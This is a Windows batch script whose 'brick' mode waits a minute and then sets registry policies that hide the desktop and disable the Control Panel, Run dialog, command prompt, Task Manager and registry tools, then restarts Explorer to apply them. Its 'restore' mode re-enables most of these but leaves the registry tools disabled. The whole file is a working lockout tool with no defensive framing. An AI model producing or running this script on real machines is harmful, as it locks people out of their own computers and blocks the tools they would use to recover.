@echo off
chcp 65001>nul





if "%1" == "brick" (
  timeout /t 60 >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop            /t REG_DWORD /d 1 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel       /t REG_DWORD /d 1 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun                /t REG_DWORD /d 1 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableCMD           /t REG_DWORD /d 1 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableTaskMgr       /t REG_DWORD /d 1 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
) else if "%1" == "restore" (
  for /l %%i in (1,1,4) do infDefaultInstall "%~dp0unHookExec.inf"
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop      /t REG_DWORD /d 0 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 0 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun          /t REG_DWORD /d 0 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableCMD     /t REG_DWORD /d 0 /f >nul
  for /l %%i in (1,1,4) do reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System   /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul
) else exit





for /l %%i in (1,1,4) do gpupdate /force >nul

for /l %%i in (1,1,4) do taskkill /f /im explorer.exe >nul
timeout /nobreak /t 1 >nul
start "" "%winDir%\explorer.exe"
exit